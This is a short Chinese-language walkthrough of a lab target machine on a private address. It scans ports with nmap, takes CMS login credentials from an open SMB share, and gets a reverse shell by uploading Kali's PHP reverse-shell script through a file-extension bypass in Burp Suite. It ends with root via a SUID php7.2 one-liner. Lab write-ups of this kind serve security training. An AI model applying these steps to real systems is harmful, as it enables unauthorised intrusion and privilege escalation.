1.扫描存活主机
​
2.扫描端口和服务版本
nmap -p- 192.168.89.142 -sV 
Starting Nmap 7.95 ( [https://nmap.org](https://nmap.org) ) at 2025-12-15 16:43 CST
Nmap scan report for 192.168.89.142
Host is up (0.0013s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE     VERSION
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
8000/tcp open  http        Apache httpd 2.4.18 ((Ubuntu))

​
3.查看靶机网页服务
这里要尝试80端口和8000端口，80端口没有什么有用的东西，8000端口发现了是一个cms，叫做kekon
​
4.信息搜集
搜索kekon相关漏洞，在searchsploit里面得到一个txt文件，有漏洞用法，这里还要用到445号端口的smb服务，可以通过smb://192.168.89.142/sambashare/访问靶机的smbshare目录，得到两个文件，其中一个是一封信，猜测应该就是那个cms网站的登录的相关内容，这里给了secret，实际就是密码，账号是daisa@phptographer.com,密码是babygirl，然后去扫描靶机的8000端口的页面，得到/admin的登录页面，成功登录。
​
5.漏洞利用
实际上是一个文件上传漏洞，我本来尝试一句话木马反弹shell，但是不行，最后用的是kali自带的反弹shell的脚本，上传文件，先把文件名改成1.php.jpg，然后使用burpsuite在改成1.php，然后去这个8000端口下的/content找到上传的文件，实际是php-reverse-shell.php,然后点击这个文件就能反弹shell到kali了。
​
6.权限提升
尝试sudo -l发现无法执行，那么尝试suid提权，执行find / -perm -4000 2>/dev/null,然后发现有一个php7.2，使用这个进行提权，执行/usr/bin/php7.2 -r "pcntl_exec('/bin/sh', ['-p']);" 就能直接拿到root权限，靶机渗透完成。
